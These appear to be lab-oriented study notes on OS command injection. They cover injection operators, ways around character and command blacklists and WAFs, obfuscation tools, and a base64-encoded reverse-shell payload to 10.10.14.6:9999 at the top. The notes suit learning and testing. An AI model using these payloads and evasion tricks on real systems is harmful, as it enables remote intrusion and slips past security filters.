## delete


# Command Injection(CI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

- `echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85OTk5IDA+JjEK|base64${IFS}-d |bash` Send the payload through CI

# Detection
The process of detecting basic OS Command Injection vulnerabilities is the same process for exploiting such vulnerabilities. We attempt to append our command through various injection methods. If the command output changes from the intended usual result, we have successfully exploited the vulnerability.

## Command Injection Methods
To inject an additional command to the intended one, we may use any of the following operators:

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
|--------------------|---------------------|-----------------------|------------------|
| Semicolon          | ;                   | %3b                   | Both             |
| New Line           | \n                  | %0a                   | Both             |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown) |
| AND                | &&                  | %26%26                | Both (only if first succeeds) |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails) |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only) |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only) |


# Injecting Commands
## Bypassing Front-End Validation
The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application. To do so, we can start Burp Suite.

# Identifying Filters
## Filter/WAF Detection
This error message can be displayed in various ways. In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the PHP web application itself. If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.

## Blacklisted Characters
A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. 
Let us reduce our request to one character at a time and see when it gets blocked

# Bypassing Filters
## Bypass Blacklisted Spaces
A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character

### Using Tabs
Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (127.0.0.1%0a%09) and see if our request is accepted:

### Using $IFS
Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use ${IFS} where the spaces should be, the variable should be automatically replaced with a space, and our command should work. Let us use ${IFS} and see if it works (127.0.0.1%0a${IFS}):

### Using Brace Expansion
There are many other methods we can utilize to bypass space filters. For example, we can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces.
Command arguments, like (127.0.0.1%0a{ls,-la}). To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.

## Bypassing Other Blacklisted Characters
Besides injection operators and space characters, a very commonly blacklisted character is the slash (/) or backslash (\) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

### Linux
There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (or any other character) is through Linux Environment Variables like we did with ${IFS}. While ${IFS} is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify start and length of our string to exactly match this character.

So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character, which we can use in our payload:
```bash
$ echo ${PATH:0:1}
/
```

We can do the same with the $HOME or $PWD environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator
```bash
$ echo ${LS_COLORS:10:1} 
;
```

The printenv command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.

```
127.0.0.1${LS_COLORS:10:1}${IFS}
${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt = /home/1nj3c70r/flag.txt
```

### Windows
The same concept work on Windows as well. For example, to produce a slash in Windows Command Line (CMD), we can echo a Windows variable (%HOMEPATH% -> \Users\htb-student), and then specify a starting position (~6 -> \htb-student), and finally specifying a negative end position, which in this case is the length of the username htb-student (-11 -> \) :
```
> echo %HOMEPATH:~6,-11%
\
```

We can achieve the same thing using the same variables in Windows PowerShell. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:
```powershell
PS > $env:HOMEPATH[0]
\
```

We can also use the Get-ChildItem Env: PowerShell command to print all environment variables and then pick one of them to produce a character we need. Try to be creative and find different commands to produce similar character

## Character Shifting
There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need:
```bash
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)

\
```

# Bypassing Blacklisted Commands
A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.

There are various methods of command obfuscation that vary in complexity, as we will touch upon later with command obfuscation tools. We will cover a few basic techniques that may enable us to change the look of our command to bypass filters manually.

## Linux & Windows
One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote ", in addition to a few others.

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the whoami command, we can insert single quotes between its characters, as follows:
```bash
w'h'o'am'i
w"h"o"am"i
```

The important things to remember are that we cannot mix types of quotes and the number of quotes must be even. We can try one of the above in our payload (127.0.0.1%0aw'h'o'am'i).

## Linux Only
We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command. These characters include the backslash \ and the positional parameter character $@. This works exactly as it did with the quotes, but in this case, the number of characters do not have to be even, and we can insert just one of them if we want to:
```bash
who$@ami
w\ho\am\i
```

## Windows Only
There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (^) character, as we can see in the following example:
```bash
> who^ami
```

## Advanced Command Obfuscation
In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.

### Case Manipulation
One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in.

However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```

Once we replace the spaces with tabs (%09), we see that the command works perfectly:


### Reversed Commands
Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing imaohw instead of whoami to avoid triggering the blacklisted command.

We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:
```bash
$ echo 'whoami' | rev
```

Then, we can execute the original command by reversing it back in a sub-shell ($()), as follows:
```bash
$ $(rev<<<'imaohw')
```

The same can be applied in Windows. We can first reverse a string, as follows:
```powershell
PS > "whoami"[-1..-20] -join ''
```
We can now use the below command to execute a reversed string with a PowerShell sub-shell (iex "$()"), as follows:

```powershell
PS > iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands
The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.

We can utilize various encoding tools, like base64 (for b64 encoding) or xxd (for hex encoding). Let's take base64 as an example. First, we'll encode the payload we want to execute (which includes filtered characters):
```bash
$ echo -n 'cat /etc/passwd | grep 33' | base64
```

Now we can create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed (i.e. bash<<<), as follows:
```bash
$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

`Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.`

Now we can use this command (once we replace the spaces) to execute the same command through command injection:

Even if some commands were filtered, like bash or base64, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.



We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:
```bash
PS > [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

We may also achieve the same thing on Linux, but we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:
```bash
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (iex "$()"), as follows:
```bash
PS > iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

# Evasion Tools
If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools. This section will discuss a couple of examples of these types of tools, one for Linux and another for Windows.

## Linux (Bashfuscator)
A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:
```bash
$ git clone https://github.com/Bashfuscator/Bashfuscator
$ cd Bashfuscator
$ pip3 install setuptools==65
$ python3 setup.py install --user

$ ./bashfuscator -c 'cat /etc/passwd'
```

However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:
```bash
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

## Windows (DOSfuscation)
There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike Bashfuscator, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:
```powershell
PS > git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS > cd Invoke-DOSfuscation
PS > Import-Module .\Invoke-DOSfuscation.psd1
PS > Invoke-DOSfuscation
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation\Encoding> encoding
Invoke-DOSfuscation\Encoding> 1
```



